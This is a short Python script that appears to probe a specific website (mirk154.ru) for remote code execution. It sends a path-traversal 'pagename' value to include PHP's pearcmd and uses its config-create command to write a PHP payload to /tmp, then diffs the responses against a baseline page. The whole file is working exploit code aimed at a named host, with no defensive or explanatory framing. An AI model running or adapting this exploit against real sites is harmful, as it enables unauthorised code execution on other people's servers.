import re
from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
pid = vuln._find_page(base)
payload = "<?=" + vuln._chrlit("PBLRCETEST") + "?>"
incp = "templates/" + "../" * 4 + "usr/local/lib/php/pearcmd"
r1 = vuln._req("POST", base + "/?+config-create+/" + payload + "+/tmp/pblx1.php",
               body=("page_id=%d&pagename=%s" % (pid, vuln._denc(incp))).encode(), ctype=CT)
t1 = r1.text or ""

base_r = vuln._req("POST", base + "/",
                   body=("page_id=%d&pagename=%s" % (pid, vuln._denc("templates/" + "../" * 4 + "wp-content/themes/mirk/404"))).encode(), ctype=CT)
t0 = base_r.text or ""
print("длины:", len(t0), len(t1))

import difflib
for line in difflib.unified_diff(t0.splitlines(), t1.splitlines(), lineterm="", n=1):
    if line.startswith(("+", "-")) and not line.startswith(("+++", "---")):
        print(line[:300])